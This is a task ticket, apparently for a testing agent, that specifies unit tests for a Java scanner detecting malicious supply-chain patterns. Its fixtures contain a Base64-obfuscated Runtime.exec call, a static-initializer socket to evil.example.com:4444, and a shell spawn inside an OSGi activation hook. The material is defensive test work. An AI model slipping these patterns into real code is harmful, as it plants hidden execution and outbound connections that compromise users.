---
id: SC-002-test-001
workflow_id: SC-002
type: testing
agent: tester
status: pending
priority: high
created: 2026-04-08T00:00:00Z
updated: 2026-04-08T00:00:00Z
depends_on: [SC-002-spec-001, SC-002-impl-001]
blocks: [SC-002-review-001]
---

# Test: ForbiddenApiScanner malicious pattern detection

## Context

Write tests for `scanForMaliciousPatterns(Path)` using synthetic Java fixture files.

**Implementation**: bmad/gastown/bead/.issues/coder/SC-002-impl-001.md

## Test Requirements

- [ ] One fixture file per pattern type (3 fixture files)
- [ ] Positive test per pattern type (fixture triggers detection)
- [ ] Negative test: clean file returns empty list
- [ ] Graph node creation verified (VULNERABILITY node present after scan)
- [ ] All 116 baseline tests still pass

## Test Scenarios

### Fixture: ObfuscatedExecFixture.java
```java
// Simulates: exec(new String(Base64.getDecoder().decode("...")))
public class ObfuscatedExecFixture {
    public void run() throws Exception {
        Runtime.getRuntime().exec(new String(Base64.getDecoder().decode("dG91Y2ggL3RtcC9wd25lZA==")));
    }
}
```
Expected: 1 finding, type=OBFUSCATED_EXEC, severity=CRITICAL

### Fixture: StaticInitNetworkFixture.java
```java
public class StaticInitNetworkFixture {
    static {
        try { new java.net.Socket("evil.example.com", 4444); } catch (Exception ignored) {}
    }
}
```
Expected: 1 finding, type=STATIC_INIT_NETWORK, severity=CRITICAL

### Fixture: LifecycleProcessSpawnFixture.java
```java
import org.osgi.service.component.annotations.Activate;
public class LifecycleProcessSpawnFixture {
    @Activate
    public void activate() throws Exception {
        new ProcessBuilder("sh", "-c", "id").start();
    }
}
```
Expected: 1 finding, type=LIFECYCLE_PROCESS_SPAWN, severity=CRITICAL

### Negative Fixture: CleanFixture.java
```java
public class CleanFixture {
    public String greet(String name) { return "Hello, " + name; }
}
```
Expected: empty list

## Test File

`src/test/java/com/dede/cloud/ForbiddenApiScannerMaliciousTest.java`

Fixture files: `src/test/resources/supply-chain-fixtures/`

## Progress Log

### 2026-04-08T00:00:00Z
Issue created by Mayor.
